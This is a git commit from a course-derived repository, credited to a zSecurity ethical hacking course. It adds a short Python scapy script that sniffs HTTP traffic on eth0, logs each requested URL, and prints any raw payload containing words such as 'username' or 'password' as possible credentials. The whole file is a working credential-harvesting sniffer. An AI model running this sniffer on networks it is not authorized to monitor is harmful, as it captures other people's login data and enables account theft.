bbb3cf4aeed1f9e9acaa0e3a5419f40559e5cae3
PatentLife <60039723+PatentLife@users.noreply.github.com>
2023-10-15 08:50:55 -1000

    Add files via upload
    Packet sniffer for python
    
    Credit: zSecurity - learn python & ethical hacking from scratch

---
+++ packet_sniffer.py
@@ -0,0 +1,31 @@
+#!/usr/bin/env/ python
+
+import scapy.all as scapy
+from scapy.layers import http
+
+def sniff(interface):
+    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
+    #BPF syntax is filter function
+
+def get_URL(packet):
+    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+
+def get_login_info(packet):
+    if packet.haslayer(scapy.Raw):
+        load = packet[scapy.Raw].load
+        keywords = ["username", "password", "login", "user", "pass"]
+        for keyword in keywords:
+            if keyword in load:
+                return load
+
+
+def process_sniffed_packet(packet):
+    if packet.haslayer(http.HTTPRequest):
+        url = get_URL(packet)
+        print("[+] http request >>" + url)
+
+        login_info = get_login_info(packet)
+        if login_info:
+            print("\n\n[+] Possible username/password >> " + login_info + "\n\n")
+
+sniff("eth0")
